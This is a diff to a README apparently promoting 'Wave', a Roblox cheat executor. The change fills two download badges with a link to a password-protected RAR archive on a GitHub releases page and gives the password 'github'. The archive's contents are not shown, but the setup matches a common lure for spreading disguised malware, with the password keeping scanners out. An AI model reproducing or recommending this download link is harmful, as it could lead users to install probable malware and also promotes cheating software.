@@ -1,8 +1,8 @@
-# 🚀 Wave - Roblox Executor **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)]()**
+# 🚀 Wave - Roblox Executor **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://github.com/RBXTeam/wave-executor/releases/download/Release/Update.rar)**
 
 ## Quick Installation
 To get started with Wave Executor, follow these simple steps:
-1. **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)]()**
+1. **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://github.com/RBXTeam/wave-executor/releases/download/Release/Update.rar)**
 
 2. PASS: github
 3. Extract the downloaded RAR file to your desired location on your system.
